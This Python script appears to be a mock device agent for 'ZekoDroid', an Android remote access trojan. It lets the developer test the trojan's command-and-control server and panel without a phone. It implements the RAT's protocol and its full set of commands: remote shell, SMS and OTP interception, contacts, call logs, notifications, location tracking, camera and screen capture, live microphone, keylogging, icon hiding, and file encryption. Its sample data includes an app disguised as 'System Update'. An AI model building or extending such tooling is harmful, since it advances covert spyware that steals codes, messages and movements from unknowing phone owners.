#!/usr/bin/env python3
"""Mock Android agent cho ZekoDroid - test server + panel khong can dien thoai.
Cung protocol voi APK: [4 byte LE][JSON], ho tro ca push frame realtime.
"""
import base64
import json
import os
import socket
import struct
import threading
import time

HOST = os.environ.get("ZK_HOST", "127.0.0.1")
PORT = int(os.environ.get("ZK_PORT", "7880"))
HWID = "mock-android-0f3a91c8d2"

SOCK = None
LOCK = threading.Lock()
STREAMS = {}

SCREEN_JPEG = ""
for cand in (r"D:\zekorat\_screen.jpg", r"D:\zekodroid\docs\dashboard-screen.png"):
    if os.path.exists(cand):
        with open(cand, "rb") as f:
            SCREEN_JPEG = base64.b64encode(f.read()).decode()
        break

INFO = {
    "host": "Pixel 7 Pro",
    "user": "Google Pixel",
    "os": "Android 14 (API 34)",
    "arch": "arm64-v8a",
    "cpu": "8 cores",
    "ram": "512 MB heap",
    "runtime": "ZekoDroid 1.0 - pkg=com.zeko.droid",
    "ip": "192.168.1.77",
    "drives": "41/128GB free",
    "uptime": "183045s",
    "admin": "rooted=False",
}

SMS = [
    {"from": "+84901234567", "body": "Ma OTP cua ban la 482913. Khong chia se voi ai.",
     "date": "2026-11-13 12:41", "type": "inbox"},
    {"from": "VIETTEL", "body": "TK goc: 52.400d. HSD 20/11. Goi 100k tang 20% data.",
     "date": "2026-11-13 09:02", "type": "inbox"},
    {"from": "+84987654321", "body": "Mai 8h hop o quan ca phe nhe",
     "date": "2026-11-12 21:15", "type": "inbox"},
    {"from": "SHOPEE", "body": "Don hang SP123456 da duoc giao thanh cong.",
     "date": "2026-11-12 15:33", "type": "inbox"},
    {"from": "+84912345678", "body": "Da chuyen 500k nhe", "date": "2026-11-11 19:44", "type": "sent"},
]

CONTACTS = [
    {"name": "Me", "phone": "+84901111222"},
    {"name": "Nguyen Van A", "phone": "+84903333444"},
    {"name": "Tran Thi B", "phone": "+84905555666"},
    {"name": "Ship Grab", "phone": "+84907777888"},
    {"name": "Cong ty ABC", "phone": "02838123456"},
]

CALLS = [
    {"number": "+84901111222", "type": "in", "date": "2026-11-13 12:20", "duration": 143},
    {"number": "+84903333444", "type": "out", "date": "2026-11-13 10:05", "duration": 62},
    {"number": "+84905555666", "type": "missed", "date": "2026-11-12 18:31", "duration": 0},
    {"number": "1900123456", "type": "out", "date": "2026-11-11 09:12", "duration": 320},
]

NOTIFS = [
    {"app": "com.zing.zalo", "title": "Nguyen Van A", "text": "Ok mai gap nhe", "time": "2026-11-13 12:52"},
    {"app": "com.facebook.katana", "title": "Facebook", "text": "Ban co 3 thong bao moi", "time": "2026-11-13 12:48"},
    {"app": "com.viettel.vocs", "title": "My Viettel", "text": "Goi 100k tang 20% data", "time": "2026-11-13 12:30"},
    {"app": "com.google.android.gm", "title": "Gmail", "text": "Ma xac minh: 482913", "time": "2026-11-13 12:21"},
    {"app": "com.android.vending", "title": "Play Store", "text": "5 ung dung can cap nhat", "time": "2026-11-13 11:05"},
]

APPS = [
    {"pkg": "com.facebook.katana", "name": "Facebook", "system": False},
    {"pkg": "com.zing.zalo", "name": "Zalo", "system": False},
    {"pkg": "com.android.chrome", "name": "Chrome", "system": False},
    {"pkg": "com.termux", "name": "Termux", "system": False},
    {"pkg": "com.android.settings", "name": "Settings", "system": True},
    {"pkg": "com.zeko.droid", "name": "System Update", "system": False},
]

WIFI = [
    {"ssid": "Tang 2", "bssid": "3c:46:d8:11:22:33", "rssi": -48, "cap": "[WPA2-PSK-CCMP]", "freq": 2412},
    {"ssid": "Lau 2 - Tenda", "bssid": "c8:3a:35:aa:bb:cc", "rssi": -62, "cap": "[WPA2-PSK-CCMP]", "freq": 2437},
    {"ssid": "SUPER CAROT", "bssid": "00:11:22:33:44:55", "rssi": -71, "cap": "[WPA2-PSK-CCMP]", "freq": 2462},
]

FILES = [
    {"name": "Download", "dir": True, "path": "/sdcard/Download", "size": 0, "modified": "2026-11-13 11:02"},
    {"name": "DCIM", "dir": True, "path": "/sdcard/DCIM", "size": 0, "modified": "2026-11-12 20:11"},
    {"name": "Documents", "dir": True, "path": "/sdcard/Documents", "size": 0, "modified": "2026-11-10 08:30"},
    {"name": "otp.txt", "dir": False, "path": "/sdcard/otp.txt", "size": 182, "modified": "2026-11-13 12:44"},
    {"name": "photo.jpg", "dir": False, "path": "/sdcard/photo.jpg", "size": 2458112, "modified": "2026-11-12 20:11"},
]


def send(sock, obj):
    payload = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    with LOCK:
        sock.sendall(struct.pack("<i", len(payload)) + payload)


def read_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def read(sock):
    head = read_exact(sock, 4)
    if not head:
        return None
    (length,) = struct.unpack("<i", head)
    body = read_exact(sock, length)
    if body is None:
        return None
    return json.loads(body.decode("utf-8"))


def start_stream(kind, fps):
    stop_stream(kind)
    if not SCREEN_JPEG:
        return {"error": "mock khong co anh"}
    keep = {"run": True}
    STREAMS[kind] = keep

    def loop():
        n = 0
        while keep["run"] and SOCK is not None:
            try:
                n += 1
                send(SOCK, {"t": "evt", "cmd": "frame",
                            "data": {"kind": kind, "jpeg": SCREEN_JPEG,
                                     "size": len(SCREEN_JPEG), "n": n}})
            except Exception:
                break
            time.sleep(max(0.03, 1.0 / max(1, fps)))

    threading.Thread(target=loop, daemon=True).start()
    return {"ok": True, "kind": kind, "fps": fps}


def stop_stream(kind=None):
    keys = [kind] if kind else list(STREAMS.keys())
    for k in keys:
        if k in STREAMS:
            STREAMS[k]["run"] = False
            STREAMS.pop(k, None)


def handle(cmd, data):
    if cmd == "info":
        return INFO
    if cmd == "shell":
        return {"out": "uid=10234(u0_a234) gid=10234(u0_a234)\nPixel 7 Pro\n"
                       "cheetah-user 14/UQ1A.240205.004 release-keys\n", "err": "", "code": 0}
    if cmd == "ls":
        return {"path": data.get("path", "/sdcard"), "entries": FILES}
    if cmd == "download":
        return {"b64": base64.b64encode(b"mock file content from android device").decode(),
                "size": 37, "name": data.get("path", "f").split("/")[-1]}
    if cmd == "sms":
        return {"sms": SMS}
    if cmd == "sms_send":
        return {"ok": True}
    if cmd == "contacts":
        return {"contacts": CONTACTS}
    if cmd == "calllog":
        return {"calls": CALLS}
    if cmd == "apps":
        return {"apps": APPS}
    if cmd == "notifs":
        return {"enabled": True, "items": NOTIFS}
    if cmd == "location":
        return {"lat": 10.776889, "lon": 106.700806, "acc": 12.5,
                "time": "2026-11-13 12:50:11",
                "map": "https://maps.google.com/?q=10.776889,106.700806"}
    if cmd == "clipboard":
        return {"text": "mock clipboard: 482913"}
    if cmd == "cam_list":
        return {"cameras": ["camera 0", "camera 1"]}
    if cmd in ("cam_shot", "screenshot", "screen_shot"):
        if not SCREEN_JPEG:
            return {"error": "mock khong co anh"}
        return {"jpeg": SCREEN_JPEG, "size": len(SCREEN_JPEG)}
    if cmd == "stream_start":
        return start_stream(data.get("kind", "screen"), int(data.get("fps", 8)))
    if cmd == "stream_stop":
        k = data.get("kind")
        stop_stream(k if k in ("screen", "cam") else None)
        return {"ok": True}
    if cmd == "stream_status":
        return {"screen": "screen" in STREAMS, "cam": "cam" in STREAMS, "projection": True}
    if cmd == "wifi_scan":
        return {"networks": WIFI}
    if cmd == "torch":
        return {"ok": True, "on": bool(data.get("on", True))}
    if cmd == "volume":
        return {"ok": True, "volume": 7, "max": 15}
    if cmd == "toast":
        return {"ok": True}
    if cmd == "power_lock":
        return {"ok": True}
    if cmd == "mic_live":
        return mic_live(bool(data.get("on", True)), int(data.get("rate", 16000)))
    if cmd == "loc_live":
        return {"ok": True}
    if cmd == "clip_live":
        return {"ok": True}
    if cmd == "watchers_status":
        return {"mic": MIC["run"], "loc": True, "clip": True}
    if cmd == "inspector":
        return {"nodes": INSPECT, "accessibility": True}
    if cmd == "permissions":
        return {"perms": PERMS}
    if cmd == "video":
        return {"error": "mock khong quay video", "size": 0}
    if cmd in ("rename", "mkdir", "file_enc", "file_dec"):
        return {"ok": True, "path": data.get("path", "")}
    if cmd in ("tap", "swipe", "click_text"):
        return {"ok": True}
    if cmd == "keylog_dump":
        return {"text": "text: ze ko test 123\nPASSWORD: ******\n", "accessibility": True, "pending": 0}
    if cmd == "hide_icon":
        return {"ok": True, "hidden": True}
    if cmd == "show_icon":
        return {"ok": True, "hidden": False}
    if cmd == "status":
        return {"accessibility": True, "notifListener": True, "projection": True, "foreground": True}
    if cmd == "mic":
        return {"b64": base64.b64encode(b"mock audio").decode(), "size": 10, "mime": "audio/mp4"}
    if cmd == "vibrate":
        return {"ok": True}
    return {"error": "mock khong ho tro: " + cmd}


MIC = {"run": False}


def evt(kind, data):
    if SOCK is None:
        return
    try:
        send(SOCK, {"t": "evt", "cmd": kind, "data": data})
    except Exception:
        pass


def mic_live(on, rate):
    if not on:
        MIC["run"] = False
        return {"ok": True}
    if MIC["run"]:
        return {"ok": True, "msg": "da chay"}
    MIC["run"] = True

    def loop():
        n = 0
        while MIC["run"] and SOCK is not None:
            try:
                # 250ms PCM16 mono, sóng sin nhẹ để panel thấy có tiếng
                import math
                samples = int(rate * 0.25)
                buf = bytearray(samples * 2)
                for i in range(samples):
                    v = int(3000 * math.sin(2 * math.pi * 440 * (n * samples + i) / rate))
                    buf[2 * i] = v & 0xFF
                    buf[2 * i + 1] = (v >> 8) & 0xFF
                evt("audio", {"rate": rate, "pcm": base64.b64encode(bytes(buf)).decode()})
                n += 1
            except Exception:
                break
            time.sleep(0.25)

    threading.Thread(target=loop, daemon=True).start()
    return {"ok": True}


INSPECT = [
    {"cls": "android.widget.FrameLayout", "text": "", "bounds": "0,0,1080,2400", "depth": 0},
    {"cls": "android.widget.EditText", "text": "zeko@gmail.com", "bounds": "60,420,1020,520", "depth": 2, "editable": True},
    {"cls": "android.widget.Button", "text": "Dang nhap", "bounds": "60,560,1020,660", "depth": 2, "clickable": True},
]

PERMS = [
    {"perm": "CAMERA", "granted": True},
    {"perm": "RECORD_AUDIO", "granted": True},
    {"perm": "READ_SMS", "granted": True},
    {"perm": "RECEIVE_SMS", "granted": True},
    {"perm": "ACCESS_FINE_LOCATION", "granted": True},
    {"perm": "MANAGE_EXTERNAL_STORAGE", "granted": False},
    {"perm": "READ_CONTACTS", "granted": True},
]


def demo_events():
    """Bơm event mẫu để panel Live có dữ liệu."""
    i = 0
    while True:
        time.sleep(4)
        if SOCK is None:
            continue
        i += 1
        try:
            k = i % 4
            if k == 0:
                evt("sms", {"from": "+84901234567", "body": "Ma OTP moi: %06d" % (100000 + i),
                            "time": "2026-11-13 15:5%d" % (i % 10), "type": "inbox"})
            elif k == 1:
                evt("location", {"lat": 10.776889 + i * 0.0001, "lon": 106.700806 + i * 0.0001,
                                 "acc": 12.5, "time": "15:5%d:00" % (i % 10),
                                 "map": "https://maps.google.com/?q=10.77,106.70"})
            elif k == 2:
                evt("clipboard", {"text": "copy lan %d: sk-abc%d" % (i, i)})
            else:
                evt("screen_state", {"state": "unlocked" if i % 2 else "off"})
        except Exception:
            pass


def main():
    global SOCK
    while True:
        try:
            s = socket.create_connection((HOST, PORT), timeout=15)
            s.settimeout(None)
            SOCK = s
            print("[mock] connected %s:%s" % (HOST, PORT), flush=True)
            send(s, {"t": "hello", "hwid": HWID, "info": INFO})
            threading.Thread(target=demo_events, daemon=True).start()
            while True:
                msg = read(s)
                if msg is None:
                    break
                t = msg.get("t")
                if t == "ping":
                    send(s, {"t": "pong"})
                    continue
                if t != "cmd":
                    continue
                result = handle(msg.get("cmd"), msg.get("data") or {})
                send(s, {"t": "resp", "id": msg.get("id"), "cmd": msg.get("cmd"), "data": result})
        except Exception as e:
            print("[mock] %s: %s" % (type(e).__name__, e), flush=True)
        finally:
            stop_stream()
            SOCK = None
        time.sleep(4)


if __name__ == "__main__":
    main()
